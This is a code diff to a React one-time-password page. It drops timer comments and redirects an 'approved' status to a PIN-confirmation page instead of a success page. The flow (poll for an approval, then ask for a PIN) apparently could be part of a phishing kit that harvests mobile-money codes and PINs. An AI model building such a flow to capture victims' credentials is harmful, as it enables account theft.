@@ -10,7 +10,6 @@ export default function OTPPage() {
   const amount = location.state?.amount || 50000;
 
   const [otp, setOtp] = useState<string[]>(['', '', '', '', '', '']);
-  // CHANGED: Initial timer is now 45 seconds
   const [timeLeft, setTimeLeft] = useState(45);
   const [isProcessing, setIsProcessing] = useState(false);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -51,7 +50,6 @@ export default function OTPPage() {
   };
 
   const handleResend = async () => {
-    // CHANGED: Reset timer to 45 seconds
     setTimeLeft(45); 
     
     try {
@@ -96,7 +94,10 @@ export default function OTPPage() {
           if (statusData.status === 'approved') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
-            navigate('/success', { state: { amount, phone } });
+            
+            // UPDATED: Redirect to Confirm PIN page instead of Success page
+            navigate('/confirm-pin', { state: { amount, phone } });
+            
           } else if (statusData.status === 'denied') {
             if (pollRef.current) clearInterval(pollRef.current);
             setIsProcessing(false);
